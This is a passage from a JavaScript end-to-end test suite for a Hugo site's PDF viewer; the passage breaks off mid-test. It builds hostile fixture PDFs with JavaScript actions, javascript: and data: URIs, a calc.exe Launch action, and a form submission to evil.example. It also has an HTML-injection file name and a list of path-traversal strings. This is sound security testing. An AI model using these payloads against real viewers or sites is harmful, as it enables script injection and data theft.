// tests/admin/e2e-viewer.mjs — end-to-end test of the public materials viewer (static/viewer/) and the
// {{< pdf >}} shortcode (layouts/shortcodes/pdf.html).
//
// Builds the site with the pinned Hugo from an exported copy of the repo (the real content/ is never
// touched) plus a test post that uses the shortcode and generated fixtures:
//   - 讲义-第1章.pdf      32 pages of Chinese text made by Chromium's page.pdf()
//   - 中文字体 测试.pdf    hand-written PDF using the NON-embedded font /STSong-Light + /UniGB-UCS2-H
//                          (only renders / extracts text if the vendored cmaps are found)
//   - links.pdf           hand-written: https, javascript: (URI and JavaScript action) and internal links
//   - locked.pdf          hand-written, with an /Encrypt dictionary (password required)
//   - broken.pdf, photo.png, notes.docx
// and serves it from a tiny HTTP server that logs every request (also those of the PDF.js worker).
//
// Run from the repo root:   node tests/admin/e2e-viewer.mjs
// Env:
//   VIEWER_E2E_DIR   where the export, build and screenshots go (default: $ADMIN_TEST_TMP/e2e-viewer or <os tmp>/admin-e2e-viewer)
//   HUGO_BIN         Hugo binary (see mock-github.mjs)
//   ONLY=<substr>    run only tests whose name contains this
//   DEBUG=1          echo the browser console

import { createRequire } from 'node:module';
import assert from 'node:assert/strict';
import crypto from 'node:crypto';
import fs from 'node:fs';
import http from 'node:http';
import os from 'node:os';
import path from 'node:path';
import { startMock, buildSite, mimeType, hugoBin } from './mock-github.mjs';
import { parseFileParam, viewerHref } from '../../static/viewer/path.js';

const { chromium } = createRequire(import.meta.url)('playwright');

const OUT = path.resolve(process.env.VIEWER_E2E_DIR
  || (process.env.ADMIN_TEST_TMP ? path.join(process.env.ADMIN_TEST_TMP, 'e2e-viewer') : path.join(os.tmpdir(), 'admin-e2e-viewer')));
const EXPORT_DIR = path.join(OUT, 'export');
const SITE_DIR = path.join(OUT, 'site');
const SHOTS = path.join(OUT, 'screenshots');
const ONLY = process.env.ONLY || '';
fs.mkdirSync(SHOTS, { recursive: true });

const POST_SLUG = 'viewer-e2e';
const LONG_PDF = '/documents/讲义-第1章.pdf';
const CJK_PDF = '/documents/中文字体 测试.pdf';
const LINKS_PDF = '/documents/links.pdf';
const LOCKED_PDF = '/documents/locked.pdf';
const BROKEN_PDF = '/documents/broken.pdf';
const PNG = '/images/photo.png';
const DOCX = '/documents/notes.docx';
const LONG_PAGES = 32;
// adversarial fixtures (verifier)
const NAMES_SLUG = 'viewer-e2e-names';
const HASH_PDF = '/documents/量子 力学#2.pdf'; // '#' must not become a URL fragment
const PCT_PDF = '/documents/50%off.pdf'; // a literal '%' that is not percent-encoding
const XSS_PDF = `/documents/"><img src=x onerror=alert(1)>&amp;'q.pdf`; // HTML-ish file name
const ACTIONS_PDF = '/documents/actions.pdf';
const HUGE_PDF = '/documents/300-pages.pdf';
const HUGE_PAGES = 300;
const WECHAT_UA = 'Mozilla/5.0 (Linux; Android 12; V2134A Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 '
  + 'Chrome/107.0.5304.141 Mobile Safari/537.36 XWEB/5197 MMWEBSDK/20230604 MicroMessenger/8.0.38.2400(0x2800263D) WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64';

// ---------------------------------------------------------------------------
// tiny runner

const results = [];
async function test(name, fn) {
  if (ONLY && !name.includes(ONLY)) return;
  const t0 = Date.now();
  let timer;
  try {
    await Promise.race([fn(), new Promise((_, rej) => { timer = setTimeout(() => rej(new Error('test timed out after 90 s')), 90000); })]);
    clearTimeout(timer);
    results.push({ name, ok: true });
    console.log(`  ✓ ${name} (${Date.now() - t0} ms)`);
  } catch (err) {
    clearTimeout(timer);
    results.push({ name, ok: false, err });
    console.log(`  ✗ ${name}\n      ${String((err && err.stack) || err).split('\n').slice(0, 10).join('\n      ')}`);
  }
}

// ---------------------------------------------------------------------------
// hand-written PDFs

/** Assemble a PDF from object bodies (index i → object i+1) with a correct xref table. */
function buildPdf(objects, { trailerExtra = '' } = {}) {
  const parts = [Buffer.from('%PDF-1.7\n%\xe2\xe3\xcf\xd3\n', 'latin1')];
  const offsets = [];
  let len = parts[0].length;
  objects.forEach((body, i) => {
    const b = Buffer.concat([Buffer.from(`${i + 1} 0 obj\n`, 'latin1'), Buffer.isBuffer(body) ? body : Buffer.from(body, 'latin1'), Buffer.from('\nendobj\n', 'latin1')]);
    offsets.push(len);
    parts.push(b);
    len += b.length;
  });
  let xref = `xref\n0 ${objects.length + 1}\n0000000000 65535 f \n`;
  for (const o of offsets) xref += `${String(o).padStart(10, '0')} 00000 n \n`;
  xref += `trailer\n<< /Size ${objects.length + 1} /Root 1 0 R ${trailerExtra}>>\nstartxref\n${len}\n%%EOF\n`;
  parts.push(Buffer.from(xref, 'latin1'));
  return Buffer.concat(parts);
}

const stream = (content) => `<< /Length ${Buffer.byteLength(content, 'latin1')} >>\nstream\n${content}\nendstream`;
const utf16hex = (s) => [...s].map((c) => c.charCodeAt(0).toString(16).padStart(4, '0').toUpperCase()).join('');

/** One page; 中文讲义 in /STSong-Light (not embedded) via /UniGB-UCS2-H — needs cmaps/UniGB-UCS2-H.bcmap. */
function cjkPdf() {
  const content = [
    'BT /F1 44 Tf 60 700 Td <' + utf16hex('中文讲义') + '> Tj ET',
    'BT /F1 28 Tf 60 630 Td <' + utf16hex('非嵌入字体测试：宋体') + '> Tj ET',
    'BT /F2 20 Tf 60 580 Td (STSong-Light / UniGB-UCS2-H) Tj ET',
    '0.1 0.4 0.8 rg 60 520 470 12 re f',
  ].join('\n');
  return buildPdf([
    '<< /Type /Catalog /Pages 2 0 R >>',
    '<< /Type /Pages /Kids [3 0 R] /Count 1 >>',
    '<< /Type /Page /Parent 2 0 R /MediaBox [0 0 595 842] /Resources << /Font << /F1 4 0 R /F2 8 0 R >> >> /Contents 6 0 R >>',
    '<< /Type /Font /Subtype /Type0 /BaseFont /STSong-Light /Encoding /UniGB-UCS2-H /DescendantFonts [5 0 R] >>',
    '<< /Type /Font /Subtype /CIDFontType0 /BaseFont /STSong-Light /CIDSystemInfo << /Registry (Adobe) /Ordering (GB1) /Supplement 2 >> /FontDescriptor 7 0 R /DW 1000 >>',
    stream(content),
    '<< /Type /FontDescriptor /FontName /STSong-Light /Flags 6 /FontBBox [-25 -254 1000 880] /ItalicAngle 0 /Ascent 880 /Descent -120 /CapHeight 880 /StemV 93 >>',
    '<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>',
  ]);
}

/** Two pages. Page 1 has four link areas: https, URI javascript:, JavaScript action, and a jump to page 2. */
function linksPdf() {
  const c1 = [
    'BT /F1 24 Tf 60 760 Td (Links test) Tj ET',
    'BT /F1 16 Tf 60 700 Td (https://example.com/) Tj ET',
    'BT /F1 16 Tf 60 650 Td (javascript: URI) Tj ET',
    'BT /F1 16 Tf 60 600 Td (JavaScript action) Tj ET',
    'BT /F1 16 Tf 60 550 Td (Go to page 2) Tj ET',
  ].join('\n');
  const c2 = 'BT /F1 24 Tf 60 760 Td (Page two) Tj ET';
  return buildPdf([
    '<< /Type /Catalog /Pages 2 0 R >>',
    '<< /Type /Pages /Kids [3 0 R 4 0 R] /Count 2 >>',
    '<< /Type /Page /Parent 2 0 R /MediaBox [0 0 595 842] /Resources << /Font << /F1 5 0 R >> >> /Contents 6 0 R /Annots [8 0 R 9 0 R 10 0 R 11 0 R] >>',
    '<< /Type /Page /Parent 2 0 R /MediaBox [0 0 595 842] /Resources << /Font << /F1 5 0 R >> >> /Contents 7 0 R >>',
    '<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>',
    stream(c1),
    stream(c2),
    '<< /Type /Annot /Subtype /Link /Rect [55 690 300 720] /Border [0 0 0] /A << /S /URI /URI (https://example.com/) >> >>',
    '<< /Type /Annot /Subtype /Link /Rect [55 640 300 670] /Border [0 0 0] /A << /S /URI /URI (javascript:alert\\(1\\)) >> >>',
    '<< /Type /Annot /Subtype /Link /Rect [55 590 300 620] /Border [0 0 0] /A << /S /JavaScript /JS (app.alert\\(1\\)) >> >>',
    '<< /Type /Annot /Subtype /Link /Rect [55 540 300 570] /Border [0 0 0] /Dest [4 0 R /XYZ 0 842 0] >>',
  ]);
}

/**
 * One page with hostile actions: OpenAction / names-tree / page-open JavaScript, and links with Launch, a
 * mixed-case javascript: URI, a data: URI, GoToR into /admin/, a relative /admin/ URI and a SubmitForm widget.
 */
function actionsPdf() {
  return buildPdf([
    '<< /Type /Catalog /Pages 2 0 R /OpenAction << /S /JavaScript /JS (app.alert\\(1\\)) >> /Names << /JavaScript << /Names [(x) << /S /JavaScript /JS (app.alert\\(2\\)) >>] >> >> >>',
    '<< /Type /Pages /Kids [3 0 R] /Count 1 >>',
    '<< /Type /Page /Parent 2 0 R /MediaBox [0 0 595 842] /Resources << /Font << /F1 5 0 R >> >> /Contents 4 0 R /Annots [6 0 R 7 0 R 8 0 R 9 0 R 10 0 R 11 0 R] /AA << /O << /S /JavaScript /JS (app.alert\\(3\\)) >> >> >>',
    stream('BT /F1 20 Tf 60 760 Td (Hostile actions) Tj ET 0.8 0.1 0.1 rg 60 380 400 30 re f'),
    '<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>',
    '<< /Type /Annot /Subtype /Link /Rect [55 690 300 720] /A << /S /Launch /F (calc.exe) >> >>',
    '<< /Type /Annot /Subtype /Link /Rect [55 640 300 670] /A << /S /URI /URI (JaVaScRiPt:alert\\(1\\)) >> >>',
    '<< /Type /Annot /Subtype /Link /Rect [55 590 300 620] /A << /S /URI /URI (data:text/html,<script>alert\\(1\\)</script>) >> >>',
    '<< /Type /Annot /Subtype /Link /Rect [55 540 300 570] /A << /S /GoToR /F (../admin/index.html) /D [0 /Fit] >> >>',
    '<< /Type /Annot /Subtype /Link /Rect [55 490 300 520] /A << /S /URI /URI (/admin/#token) >> >>',
    '<< /Type /Annot /Subtype /Widget /FT /Btn /Rect [55 440 300 470] /T (b) /A << /S /SubmitForm /F (https://evil.example/) >> >>',
  ]);
}

/** Standard security handler with a random /U → no password (not even "") opens it. */
function lockedPdf() {
  const hex = (n) => crypto.randomBytes(n).toString('hex');
  return buildPdf([
    '<< /Type /Catalog /Pages 2 0 R >>',
    '<< /Type /Pages /Kids [3 0 R] /Count 1 >>',
    '<< /Type /Page /Parent 2 0 R /MediaBox [0 0 595 842] /Contents 4 0 R >>',
    stream('0 0 1 rg 10 10 100 100 re f'),
    `<< /Filter /Standard /V 1 /R 2 /Length 40 /P -44 /O <${hex(32)}> /U <${hex(32)}> >>`,
  ], { trailerExtra: `/Encrypt 5 0 R /ID [<${hex(16)}> <${hex(16)}>] ` });
}

// ---------------------------------------------------------------------------
// tiny static server that logs every request (Range support like GitHub Pages)

function startServer(root) {
  const log = [];
  const server = http.createServer((req, res) => {
    const u = new URL(req.url, 'http://local');
    log.push({ method: req.method, path: u.pathname, url: req.url, range: req.headers.range || '' });
    let p;
    try {
      p = decodeURIComponent(u.pathname);
    } catch {
      res.writeHead(400).end('bad request');
      return;
    }
    if (p.includes('\0') || p.includes('\\') || p.split('/').includes('..')) {
      res.writeHead(400).end('bad request');
      return;
    }
    let file = path.join(root, p);
    const notFound = () => {
      const page = path.join(root, '404.html');
      const body = fs.existsSync(page) ? fs.readFileSync(page) : Buffer.from('Not Found');
      res.writeHead(404, { 'content-type': 'text/html; charset=utf-8', 'content-length': body.length });
      res.end(req.method === 'HEAD' ? undefined : body);
    };
    let st;
    try {
      st = fs.statSync(file);
    } catch {
      return notFound();
    }
    if (st.isDirectory()) {
      if (!u.pathname.endsWith('/')) {
        res.writeHead(301, { location: u.pathname + '/' + u.search }).end();
        return;
      }
      file = path.join(file, 'index.html');
      try {
        st = fs.statSync(file);
      } catch {
        return notFound();
      }
    }
    const headers = { 'content-type': mimeType(file), 'accept-ranges': 'bytes', 'cache-control': 'no-store', 'x-content-type-options': 'nosniff' };
    const m = /^bytes=(\d+)-(\d*)$/.exec(req.headers.range || '');
    if (m) {
      const start = Number(m[1]);
      const end = Math.min(st.size - 1, m[2] ? Number(m[2]) : st.size - 1);
      if (start > end) {
        res.writeHead(416, { 'content-range': `bytes */${st.size}` }).end();
        return;
      }
      res.writeHead(206, { ...headers, 'content-range': `bytes ${start}-${end}/${st.size}`, 'content-length': end - start + 1 });
      if (req.method === 'HEAD') return res.end();
      fs.createReadStream(file, { start, end }).pipe(res);
      return;
    }
    res.writeHead(200, { ...headers, 'content-length': st.size });
    if (req.method === 'HEAD') return res.end();
    fs.createReadStream(file).pipe(res);
  });
  return new Promise((resolve) => {
    server.listen(0, '127.0.0.1', () => {
      const url = `http://127.0.0.1:${server.address().port}`;
      resolve({ url, log, close: () => new Promise((r) => { server.close(() => r()); server.closeAllConnections?.(); }) });
    });
  });
}

// ---------------------------------------------------------------------------
// browser helpers

const consoleProblems = []; // { where, text }
const externalRequests = [];
let SITE = '';

async function newContext(browser, opts = {}, { storage = {}, label = 'page' } = {}) {
  const context = await browser.newContext({ viewport: { width: 1280, height: 800 }, ...opts });
  await context.route('**/*', (route) => {
    const u = route.request().url();
    if (u.startsWith(SITE + '/') || u.startsWith('data:') || u.startsWith('blob:')) return route.continue();
    externalRequests.push({ label, url: u });
    return route.abort();
  });
  await context.addInitScript(({ storage }) => {
    // Pre-seed localStorage (e.g. a fake remembered admin token + pref-theme) and record every key the page touches.
    try {
      for (const [k, v] of Object.entries(storage)) window.localStorage.setItem(k, v);
    } catch {}
    window.__storageAccess = [];
    const P = Storage.prototype;
    for (const fn of ['getItem', 'setItem', 'removeItem', 'key', 'clear']) {
      const orig = P[fn];
      P[fn] = function (...args) {
        window.__storageAccess.push(fn + ':' + String(args[0]));
        return orig.apply(this, args);
      };
    }
    document.addEventListener('securitypolicyviolation', (e) =>
      console.error('CSP-VIOLATION', e.violatedDirective, e.blockedURI, e.sourceFile, String(e.sample || '').slice(0, 80)));
  }, { storage });
  context.on('page', (page) => watchPage(page, label));
  return context;
}

function watchPage(page, label) {
  page.on('pageerror', (e) => consoleProblems.push({ where: label, text: 'pageerror: ' + e.message }));
  page.on('console', (m) => {
    const t = m.text();
    if (process.env.DEBUG) console.log(`      [${label} console.${m.type()}] ${t.slice(0, 300)}`);
    if (m.type() === 'error' || m.type() === 'warning' || /CSP-VIOLATION/.test(t)) {
      consoleProblems.push({ where: label + ' ' + page.url(), text: t, type: m.type() });
    }
  });
  page.on('dialog', (d) => {
    consoleProblems.push({ where: label, text: 'DIALOG ' + d.message() });
    d.dismiss().catch(() => {});
  });
}

const viewerUrl = (file, extra = '') => `${SITE}/viewer/?file=${encodeURIComponent(file)}${extra}`;

async function waitReady(page) {
  await page.waitForFunction(() => document.documentElement.getAttribute('data-ready') === '1' || document.documentElement.hasAttribute('data-error'), null, { timeout: 30000 });
  const err = await page.evaluate(() => document.documentElement.getAttribute('data-error'));
  assert.equal(err, null, 'viewer reported an error: ' + err);
}

/** Wait until page N has a canvas drawn at the current scale; returns stats about its pixels. */
async function waitPageRendered(page, n) {
  await page.waitForFunction((n) => {
    const d = document.querySelector(`.page[data-page-number="${n}"]`);
    return d && d.classList.contains('rendered') && d.querySelector('canvas')
      && d.getAttribute('data-rendered-scale') === document.documentElement.getAttribute('data-scale');
  }, n, { timeout: 30000 });
  return canvasStats(page, n);
}

async function canvasStats(page, n) {
  return page.evaluate((n) => {
    const c = document.querySelector(`.page[data-page-number="${n}"] canvas`);
    if (!c) return null;
    const s = document.createElement('canvas');
    s.width = 120;
    s.height = 170;
    const ctx = s.getContext('2d');
    ctx.drawImage(c, 0, 0, s.width, s.height);
    const d = ctx.getImageData(0, 0, s.width, s.height).data;
    let dark = 0;
    let colored = 0;
    for (let i = 0; i < d.length; i += 4) {
      const [r, g, b] = [d[i], d[i + 1], d[i + 2]];
      if (r + g + b < 384) dark++;
      if (Math.max(r, g, b) - Math.min(r, g, b) > 60) colored++;
    }
    const rect = c.getBoundingClientRect();
    return { dark, colored, total: d.length / 4, width: c.width, height: c.height, cssWidth: rect.width, cssHeight: rect.height };
  }, n);
}

const renderedPages = (page) => page.evaluate(() => [...document.querySelectorAll('.page')].filter((d) => d.querySelector('canvas')).map((d) => Number(d.dataset.pageNumber)));
const attr = (page, name) => page.evaluate((n) => document.documentElement.getAttribute(n), name);

function requestsSince(server, mark) {
  return server.log.slice(mark);
}

// ---------------------------------------------------------------------------
// main

async function main() {
  console.log(`[e2e-viewer] output in ${OUT}`);
  if (!fs.existsSync(hugoBin())) throw new Error('Hugo not found at ' + hugoBin());

  // ---- unit checks of the path validator (pure) ----------------------------------------------------
  await test('path.js accepts site paths and rejects everything else', async () => {
    const ok = parseFileParam('/documents/讲义-第1章.pdf', 'https://himzfx.github.io');
    assert.equal(ok.ok, true);
    assert.equal(ok.kind, 'pdf');
    assert.equal(ok.name, '讲义-第1章.pdf');
    assert.equal(ok.href, '/documents/' + encodeURIComponent('讲义-第1章.pdf'));
    assert.equal(parseFileParam('/documents/%E8%AE%B2%E4%B9%89.pdf').path, '/documents/讲义.pdf', 'pre-encoded paths are accepted');
    assert.equal(parseFileParam('/images/a b.PNG').kind, 'image');
    assert.equal(parseFileParam('/documents/notes.docx').kind, 'other');
    assert.equal(parseFileParam('/documents/100%.pdf').href, '/documents/100%25.pdf', 'a literal % stays literal');
    for (const bad of ['', 'documents/x.pdf', 'https://evil.example/x.pdf', '//evil.example/x.pdf', 'javascript:alert(1)',
      '/admin/index.html', '/Admin/x.pdf', '/viewer/index.html', '/documents/../admin/x.pdf', '/documents/%2e%2e/admin/x.pdf',
      '/documents/%2E%2E/x.pdf', '/documents/%252e%252e/x.pdf', '/documents/./x.pdf', '/documents/%2e/x.pdf', '/documents\\x.pdf',
      '/documents/%5c..%5cadmin/x.pdf', '/documents/a%2Fb.pdf', '/documents//x.pdf', '/documents/x.pdf\n', '/documents/\u0000x.pdf',
      '/documents/%00x.pdf', '/%2e%2e/admin/x.pdf', '/documents/x.pdf/', '/\\evil.example/x.pdf', '/%2fevil.example/x.pdf']) {
      assert.equal(parseFileParam(bad, 'https://himzfx.github.io').ok, false, `should reject ${JSON.stringify(bad)}`);
    }
    assert.equal(viewerHref('/documents/a b.pdf', { lang: 'en', embed: true }), '?file=%2Fdocuments%2Fa%20b.pdf&lang=en&embed=1');
  });

  // ---- fixtures + build --------------------------------------------------------------------------------
  const server = await startServer(SITE_DIR);
  SITE = server.url;
  const browser = await chromium.launch();
  let longPdf;
  {
    const ctx = await browser.newContext();
    const pg = await ctx.newPage();
    const sections = [];
    for (let i = 1; i <= LONG_PAGES; i++) {
      const hue = (i * 47) % 360;
      sections.push(`<section id="p${i}"><h1>第 ${i} 页 · 量子力学讲义</h1>
        <div class="bar" style="background:hsl(${hue} 70% 45%)"></div>
        <p>这是第 ${i} 页的正文。薛定谔方程描述了量子态随时间的演化：iħ∂ψ/∂t = Ĥψ。本页用于测试在线预览的懒加载、页码显示和缩放。</p>
        <p>${'波函数的统计诠释告诉我们，|ψ|² 给出粒子出现的概率密度。'.repeat(6)}</p>
        ${i === 1 ? '<p><a href="#p5">跳到第 5 页</a> · <a href="https://example.com/">example.com</a></p>' : ''}</section>`);
    }
    await pg.setContent(`<!doctype html><html lang="zh-CN"><meta charset="utf-8"><style>
      body{font-family:"WenQuanYi Zen Hei",sans-serif;margin:0;color:#111}
      section{page-break-after:always;padding:40px 50px}
      h1{font-size:30px;margin:0 0 20px} p{font-size:17px;line-height:1.8} .bar{height:30px;margin:20px 0}
      </style>${sections.join('')}</html>`);
    longPdf = await pg.pdf({ format: 'A4', printBackground: true });
    await ctx.close();
  }
  let hugePdf;
  {
    const ctx = await browser.newContext();
    const pg = await ctx.newPage();
    const secs = Array.from({ length: HUGE_PAGES }, (_, k) => `<section><h1>第 ${k + 1} 页</h1><div style="height:30px;background:hsl(${(k * 37) % 360} 70% 45%)"></div><p>${'内容 '.repeat(150)}</p></section>`);
    await pg.setContent(`<!doctype html><meta charset="utf-8"><style>section{page-break-after:always;padding:40px}</style>${secs.join('')}`);
    hugePdf = await pg.pdf({ format: 'A4', printBackground: true });
    await ctx.close();
  }
  const png = await (async () => {
    const ctx = await browser.newContext({ viewport: { width: 800, height: 500 } });
    const pg = await ctx.newPage();
    await pg.setContent('<body style="margin:0;background:linear-gradient(135deg,#0b7,#07c);font:bold 64px sans-serif;color:#fff;display:flex;align-items:center;justify-content:center;height:100vh">照片 photo.png</body>');
    const buf = await pg.screenshot({ type: 'png' });
    await ctx.close();
    return buf;
  })();

  const post = `---
title: "资料预览测试"
date: 2026-10-01
draft: false
---

这是一篇用来测试资料嵌入的文章。

{{< pdf "${LONG_PDF}" >}}

下面是第二个阅读器（命名参数）：

{{< pdf src="${CJK_PDF}" page="1" height="480" title="字体测试" >}}

图片也可以：

{{< pdf "${PNG.slice(1)}" >}}
`;
  const mock = await startMock({
    seedFiles: {
      [`content/posts/${POST_SLUG}.md`]: post,
      ['static' + LONG_PDF]: longPdf,
      ['static' + CJK_PDF]: cjkPdf(),
      ['static' + LINKS_PDF]: linksPdf(),
      ['static' + LOCKED_PDF]: lockedPdf(),
      ['static' + BROKEN_PDF]: Buffer.from('this is not a pdf at all\n'),
      ['static' + PNG]: png,
      ['static' + DOCX]: Buffer.from('PK\u0003\u0004 fake docx'),
      ['static' + HASH_PDF]: cjkPdf(),
      ['static' + PCT_PDF]: cjkPdf(),
      ['static' + XSS_PDF]: cjkPdf(),
      ['static' + ACTIONS_PDF]: actionsPdf(),
      ['static' + HUGE_PDF]: hugePdf,
      [`content/posts/${NAMES_SLUG}.md`]: `---\ntitle: "资料文件名测试"\ndate: 2026-10-02\ndraft: false\n---\n\n{{< pdf "${HASH_PDF}" >}}\n\n{{< pdf "${PCT_PDF}" >}}\n\n{{< pdf \`${XSS_PDF}\` >}}\n`,
    },
  });
  mock.exportTo(EXPORT_DIR);
  await mock.close();
  const built = await buildSite({ repoDir: EXPORT_DIR, outDir: SITE_DIR, baseURL: SITE + '/' });
  console.log(`  site built in ${built.ms} ms, served at ${SITE}`);
  if (built.stderr.trim()) console.log('  hugo stderr:\n    ' + built.stderr.trim().split('\n').join('\n    '));

  await test('viewer files are published as-is (no theme, no third-party scripts)', async () => {
    const html = fs.readFileSync(path.join(SITE_DIR, 'viewer', 'index.html'), 'utf8');
    assert.match(html, /Content-Security-Policy/);
    assert.doesNotMatch(html, /<script(?![^>]*\bsrc=)[^>]*>/, 'no inline scripts');
    const srcs = [...html.matchAll(/<(?:script|link)[^>]+(?:src|href)="([^"]+)"/g)].map((m) => m[1]);
    for (const s of srcs) assert.ok(!/^(https?:)?\/\//.test(s), 'only local resources: ' + s);
    assert.doesNotMatch(html, /katex|giscus|papermod|background/i);
    for (const f of ['viewer.js', 'viewer.css', 'path.js', 'theme.js', 'vendor/pdfjs/build/pdf.min.mjs', 'vendor/pdfjs/build/pdf.worker.min.mjs',
      'vendor/pdfjs/cmaps/UniGB-UCS2-H.bcmap', 'vendor/pdfjs/standard_fonts/FoxitSerif.pfb', 'vendor/pdfjs/wasm/openjpeg.wasm', 'vendor/pdfjs/iccs/CGATS001Compat-v2-micro.icc', 'vendor/pdfjs/LICENSE']) {
      assert.ok(fs.existsSync(path.join(SITE_DIR, 'viewer', f)), 'missing ' + f);
    }
    assert.ok(!fs.existsSync(path.join(SITE_DIR, 'viewer', 'vendor/pdfjs/build/pdf.sandbox.min.mjs')), 'no scripting sandbox');
  });

  const FAKE_TOKEN = 'github_pat_FAKE_TOKEN_must_never_be_read';
  const ctx = await newContext(browser, {}, { storage: { 'admin.token': FAKE_TOKEN }, label: 'desktop' });
  const page = await ctx.newPage();

  await test('desktop: renders the first page, lazily, with page indicator and download link', async () => {
    const mark = server.log.length;
    await page.goto(viewerUrl(LONG_PDF));
    await waitReady(page);
    const st = await waitPageRendered(page, 1);
    assert.ok(st.dark > 200, 'page 1 has text: ' + JSON.stringify(st));
    assert.ok(st.colored > 50, 'page 1 has the coloured bar');
    assert.equal(await page.title(), '讲义-第1章.pdf');
    assert.equal(await attr(page, 'data-pages'), String(LONG_PAGES));
    assert.equal(await page.inputValue('#page-input'), '1');
    assert.equal(await page.textContent('#page-count'), String(LONG_PAGES));
    assert.equal(await page.textContent('#file-name'), '讲义-第1章.pdf');
    const dl = await page.$eval('#download', (a) => ({ href: a.getAttribute('href'), download: a.getAttribute('download'), visible: !a.hidden }));
    assert.deepEqual(dl, { href: '/documents/' + encodeURIComponent('讲义-第1章.pdf'), download: '讲义-第1章.pdf', visible: true });
    const r = await renderedPages(page);
    assert.ok(r.includes(1) && r.length <= 4, 'only pages near the viewport are rendered: ' + r);
    // fit width: page fills the width (capped at 1000 CSS px on wide screens)
    const w = await page.$eval('.page[data-page-number="1"]', (d) => d.getBoundingClientRect().width);
    assert.ok(w > 900 && w <= 1000, 'fit width page width ' + w);
    assert.equal(await attr(page, 'data-fit'), '1');
    // canvas resolution follows devicePixelRatio (1 here)
    assert.ok(Math.abs(st.width - st.cssWidth) <= 2, 'canvas px ≈ css px at dpr 1');
    // text layer: Chinese text selectable
    await page.waitForSelector('.page[data-page-number="1"] .textLayer span');
    const text = await page.$eval('.page[data-page-number="1"] .textLayer', (d) => d.textContent);
    assert.match(text.replace(/\s+/g, ''), /第1页·量子力学讲义/);
    // home link + site name
    assert.equal(await page.getAttribute('#home', 'href'), SITE + '/');
    await page.waitForFunction(() => document.getElementById('site-name').textContent !== '主页', null, { timeout: 5000 }).catch(() => {});
    assert.equal((await page.textContent('#site-name')).trim(), "HimZFX's Lab");
    const reqs = requestsSince(server, mark).map((x) => x.path);
    assert.ok(reqs.some((p) => p.startsWith('/viewer/vendor/pdfjs/build/pdf.worker.min.mjs')), 'worker loaded from /viewer/vendor');
    await page.screenshot({ path: path.join(SHOTS, 'desktop.png') });
  });

  await test('desktop: scrolling renders later pages and frees far-away ones; indicator follows', async () => {
    await page.evaluate(() => window.scrollTo(0, document.querySelector('.page[data-page-number="20"]').offsetTop));
    await waitPageRendered(page, 20);
    await page.waitForFunction(() => document.getElementById('page-input').value === '20' || document.getElementById('page-input').value === '19');
    let r = await renderedPages(page);
    assert.ok(!r.includes(1), 'page 1 was released after scrolling far away: ' + r);
    assert.ok(r.length <= 10, 'bounded number of live canvases: ' + r);
    await page.evaluate(() => window.scrollTo(0, document.documentElement.scrollHeight));
    await waitPageRendered(page, LONG_PAGES);
    await page.waitForFunction((n) => document.getElementById('page-input').value === String(n), LONG_PAGES);
    r = await renderedPages(page);
    assert.ok(r.includes(LONG_PAGES) && !r.includes(20 - 10), 'rendered set moved with the viewport: ' + r);
    // jump with the page input
    await page.fill('#page-input', '7');
    await page.press('#page-input', 'Enter');
    await waitPageRendered(page, 7);
    assert.equal(await attr(page, 'data-current-page'), '7');
    const top = await page.$eval('.page[data-page-number="7"]', (d) => d.getBoundingClientRect().top);
    const bar = await page.$eval('#bar', (d) => d.getBoundingClientRect().height);
    assert.ok(top >= bar && top < bar + 30, 'page 7 sits just below the bar: ' + top);
  });

  await test('desktop: zoom in / out / fit width re-render sharply and keep the place', async () => {
    const before = await page.evaluate(() => Number(document.documentElement.getAttribute('data-zoom')));
    const w0 = await page.$eval('.page[data-page-number="7"]', (d) => d.getBoundingClientRect().width);
    await page.click('#zoom-in');
    await page.waitForFunction((b) => Number(document.documentElement.getAttribute('data-zoom')) > b, before);
    let st = await waitPageRendered(page, 7);
    const w1 = await page.$eval('.page[data-page-number="7"]', (d) => d.getBoundingClientRect().width);
    assert.ok(w1 > w0 * 1.05, `wider after zoom in ${w0} → ${w1}`);
    assert.ok(Math.abs(st.width - st.cssWidth) <= 2, 're-rendered at the new size (not just stretched)');
    assert.equal(await attr(page, 'data-fit'), '0');
    assert.equal(await attr(page, 'data-current-page'), '7', 'still on page 7');
    assert.match(await page.textContent('#zoom-label'), /^\d+%$/);
    // zoomed wider than the window → horizontal scrolling of the document, never cut off on the left
    await page.click('#zoom-in');
    await page.click('#zoom-in');
    await waitPageRendered(page, 7);
    const left = await page.$eval('.page[data-page-number="7"]', (d) => d.getBoundingClientRect().left + window.scrollX);
    assert.ok(left >= 0, 'page not cut off on the left: ' + left);
    await page.click('#zoom-out');
    await page.click('#zoom-out');
    await page.click('#zoom-out');
    await page.click('#zoom-out');
    await waitPageRendered(page, 7);
    const w2 = await page.$eval('.page[data-page-number="7"]', (d) => d.getBoundingClientRect().width);
    assert.ok(w2 < w0, `narrower after zoom out ${w0} → ${w2}`);
    await page.click('#zoom-fit');
    await page.waitForFunction(() => document.documentElement.getAttribute('data-fit') === '1');
    st = await waitPageRendered(page, 7);
    const w3 = await page.$eval('.page[data-page-number="7"]', (d) => d.getBoundingClientRect().width);
    assert.ok(Math.abs(w3 - w0) <= 2, 'fit width restores the width');
    assert.ok(await page.evaluate(() => document.documentElement.scrollWidth <= document.documentElement.clientWidth), 'no horizontal scroll at fit width');
  });

  await test('?page=N opens at that page', async () => {
    await page.goto(viewerUrl(LONG_PDF, '&page=12'));
    await waitReady(page);
    await waitPageRendered(page, 12);
    assert.equal(await attr(page, 'data-current-page'), '12');
    assert.equal(await page.inputValue('#page-input'), '12');
    const top = await page.$eval('.page[data-page-number="12"]', (d) => d.getBoundingClientRect().top);
    assert.ok(top > 0 && top < 100, 'page 12 at the top: ' + top);
    const r = await renderedPages(page);
    assert.ok(!r.includes(1), 'page 1 not rendered when starting at page 12: ' + r);
  });

  await test('non-embedded CJK font renders through the vendored cmaps', async () => {
    const mark = server.log.length;
    await page.goto(viewerUrl(CJK_PDF));
    await waitReady(page);
    const st = await waitPageRendered(page, 1);
    assert.ok(st.dark > 80, 'glyphs drawn: ' + JSON.stringify(st));
    await page.waitForSelector('.page[data-page-number="1"] .textLayer span');
    const text = await page.$eval('.page[data-page-number="1"] .textLayer', (d) => d.textContent.replace(/\s+/g, ''));
    assert.match(text, /中文讲义/);
    assert.match(text, /非嵌入字体测试/);
